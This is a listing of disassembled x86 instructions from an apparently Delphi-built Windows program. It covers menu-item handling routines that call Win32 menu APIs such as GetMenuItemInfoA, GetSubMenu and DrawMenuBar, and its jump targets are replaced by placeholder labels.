mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_459714
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_458658
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_458658
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_459898
test al al
je r-xdata
mov eax esi
call sub_458658
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_458668
call sub_4596f0
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_458668
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_458668
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_458668
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_458668
call sub_4596f0
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_458668
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_458668
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_458668
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_458668
call sub_4596f0
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45986c
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45986c
and eax 0x7f
mov al [ eax + rw-data ]
sub_459898
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_459898
and eax 0x7f
mov al [ eax + rw-data ]
sub_4598c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4565ac
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_42086c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45a5f0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_459960
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403270
mov eax [ esi + 0x44 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4599d4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4599d4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_456118
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_458a5c
mov eax ebx
pop esi
pop ebx
retn
sub_459a14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_458658
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_458668
call sub_459a14
pop ecx
test al al
je r-xdata
sub_459aac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_459a14
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_456118
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_459adc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_459aac
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45b004
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_459b4c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_459aac
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_459b68
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_459aac
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_459218
mov ebx eax
xor edx edx
mov eax edi
call sub_459714
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_458b80
mov eax [ esi + 0x34 ]
call sub_458b80
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_456abc
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_44d054
push eax
call DrawMenuBar
sub_459c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_459c54
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_403738#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_459aac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_458b80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_459c44
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_459da8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4297f0
xor eax eax
push ebp
push sub_459ea6
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4297f0
xor eax eax
push ebp
push sub_459e7b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_459c54
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4297e8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ead
mov eax [ rw-data ]
call sub_4297e8
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_459aac
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_459ecc
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45a250
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45a250
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_459f88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45a524
mov eax ebx
call sub_4086cc
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45a028
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_459f88
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404258
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044a8
lea edx [ ebp - 0x200 ]
call sub_4087bc
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45a0bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45a12c
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45a5cc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45a5cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45a5cc
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45a138
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45a028
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45a0bc
mov eax ebx
call sub_45a5f0
jmp r-xdata
sub_45a1a0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45a1e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_454418
mov eax ebx
call sub_4599fc
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45445c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_42093c
sub_45a224
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420b88
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45a1e8
sub_45a268
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_459aac
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_459aac
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45e09c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45a2c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45a399
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_459aac
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_459aac
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_458658
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458668
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4041d0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4041d0
mov eax [ ebp - 0xc ]
pop edx
call sub_407f3c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45b314
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a3a0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40400c
retn
sub_45a3ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45a268
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45a2c4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45a524
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_459c30
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_459aac
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_459aac
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40879c
mov eax [ ebp + 0x10 ]
call sub_4086b4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45a5f0
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_443644
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45a5cc
mov [ ebx + 0x41 ] 0x1
sub_45a618
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45a5cc
mov [ ebx + 0x41 ] 0x1
sub_45a6a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45a1a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45a028
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45a734
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45a770
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov dx [ esi + 0x60 ]
test dx dx
je r-xdata
mov eax esi
call sub_458658
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
jmp r-xdata
mov al 0x3
test dh 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_458668
call sub_45a770
pop ecx
inc edi
dec ebx
jne r-xdata
test dh 0x80
je r-xdata
or al 0x8
test dh 0x20
je r-xdata
or al 0x10
and eax 0xff
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx ] ax
mov ax [ esi + 0x60 ]
and ax 0xff
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dx [ esi + 0x50 ]
mov [ eax + 0x4 ] dx
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x6
jmp r-xdata
or al 0x4
sub_45a810
push ebp
mov ebp esp
push ebx
push esi
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
test ecx ecx
jl r-xdata
xor eax eax
pop esi
pop ebx
pop ebp
retn
inc ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
add edx 0x4
dec ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45a770
pop ecx
jmp r-xdata
xor ebx ebx
mov bl [ eax + 0x3f ]
cmp ebx [ edx ]
jne r-xdata
sub_45a848
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x68 ]
mov ecx sub_45a810
xchg ecx eax
call sub_456118
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
add eax eax
lea eax [ eax + eax * 2 ]
call sub_4026f4
mov esi eax
